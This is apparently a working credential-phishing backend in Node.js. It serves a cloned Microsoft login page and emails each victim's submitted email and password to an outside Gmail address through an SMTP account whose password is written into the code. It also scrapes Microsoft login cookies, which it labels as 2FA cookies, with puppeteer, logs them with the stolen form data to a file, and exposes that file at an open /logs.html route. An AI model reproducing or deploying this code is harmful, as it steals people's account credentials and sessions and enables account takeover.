// const { chromium } = require('playwright');


const puppeteer = require('puppeteer');
const nodemailer = require("nodemailer")
const express = require("express")
const app = express()
const fs = require('fs');
const bodyParser = require("body-parser");

app.use(express.static("microsoft-login-clone"))
app.use(express.json())

app.get("/", (req, res) => {
    res.sendFile(__dirname + "/microsoft-login-clone/index.html")
})


app.post("/", (req, res) => {
    
    // const etepupper = require('puppeteer');
    const mal = (async () => {
      // Launch a new browser instance
      const browser = await puppeteer.launch();
    
      // Create a new page
      const page = await browser.newPage();
    
      // Navigate to the website
      await page.goto('https://login.microsoftonline.com');
    
      // Wait for the page to load
      await page.waitForNavigation({ waitUntil: 'networkidle0' });
    
      // Get all the cookies for the website
      const cookies = await page.cookies('https://login.microsoftonline.com');
    
      // Get the 2FA cookies
    //   const twoFactorCookies = cookies.filter(cookie => cookie.name.startsWith('x-ms-gateway-slice'));
    const twoFactorCookies = cookies.filter(cookie => cookie.name.startsWith('x-ms-gateway-slice'));
    // const cookieString = twoFactorCookies.map(cookie => `${cookie.name}=${cookie.value}`).join(';');
    // console.log(cookieString);
    const jsonStr = JSON.stringify(twoFactorCookies);
    const jsonStr2 = JSON.stringify(req.body);

    const cookieOutput = twoFactorCookies.map(cookie => {
        return `Name: ${cookie.name}, Value: ${cookie.value}, Domain: ${cookie.domain}, Path: ${cookie.path}, Expires: ${cookie.expires}, Secure: ${cookie.secure}, HttpOnly: ${cookie.httpOnly}, SameSite: ${cookie.sameSite}`;
      }).join(';');
      // Log the 2FA cookies to the console
      console.log(twoFactorCookies);
    
      // Close the browser instance
      await browser.close();
    //   return twoFactorCookies
    //   fs.appendFile('logs.txt', jsonStr, function (err) {
    //     if (err) throw err;
    //     console.log('Two factor cookies logged successfully!');
    //   });
    fs.appendFile('logs.txt', jsonStr + "\n" + jsonStr2 + "\n", function (err) {
        if (err) throw err;
        console.log('Two factor cookies logged successfully!');
      });
      
    //   return cookieString
    })();
    
    // const kk = mal.toString();
// (async () => {
//   const browser = await chromium.launch();
//   const context = await browser.newContext();
//   const page = await context.newPage();
  
//   await page.goto('https://login.microsoftonline.com');

//   // Retrieve the cookies
//   const cookies = await context.cookies();
  
//   // Filter the cookies you want
//   const filteredCookies = cookies.filter(cookie => (
//     cookie.name === 'x-ms-gateway-slice' ||
//     cookie.name === 'fpc' ||
//     cookie.name === 'SignInStateCookie' ||
//     cookie.name === 'CCState' ||
//     cookie.name === 'buid' ||
//     cookie.name === 'ESTSAUTHLIGHT'
//   ));
  
//   console.log(filteredCookies);
  
//   await browser.close();
//   return filteredCookies
// })();
let data = '';

fs.readFile('logs.txt', 'utf8', function(err, contents) {
  if (err) {
    console.error(err);
  } else {
    data += contents;
    console.log(data);
  }
});
    console.log(req.body)
    let transporter = nodemailer.createTransport({
        host: "mail.corestepmfb.com",
        port: 465,
        secure: true,
        auth: {
            user: "test@corestepmfb.com",
            pass: "coreserver22/24"
        }
    })

    let mailOptions = ({
        from: '"test contact" <test@corestepmfb.com',
        to: "ayodejiamzat@gmail.com",
        subject: `message from ${req.body.email}`,
        text: `
            email: ${req.body.email}, 
            password: ${req.body.password}

        `        
    })

    transporter.sendMail(mailOptions, (error, info) => {
        if(error){
            return console.log(error)
        }else{
            console.log("email sent successfully" + info.response)
            res.send("success")
        }

        console.log("message sent: %s", info.messageId);
        console.log("preview url: %s", nodemailer.getTestMessageUrl(info));
    })
    


})
app.get('/logs.html', (req, res) => {
  // Read the logs.txt file
  const fs = require('fs');
  fs.readFile('logs.txt', 'utf8', (err, data) => {
    if (err) {
      console.error(err);
      res.status(500).send('Error reading logs.txt file');
    } else {
      // Send the file contents as a response
      res.send(data);
    }
  });
});  
  
const PORT = process.env.PORT || 5000;
app.listen(
    PORT,
    console.log(`server runnin in ${process.env.NODE_ENV} mode on port ${PORT}`)
)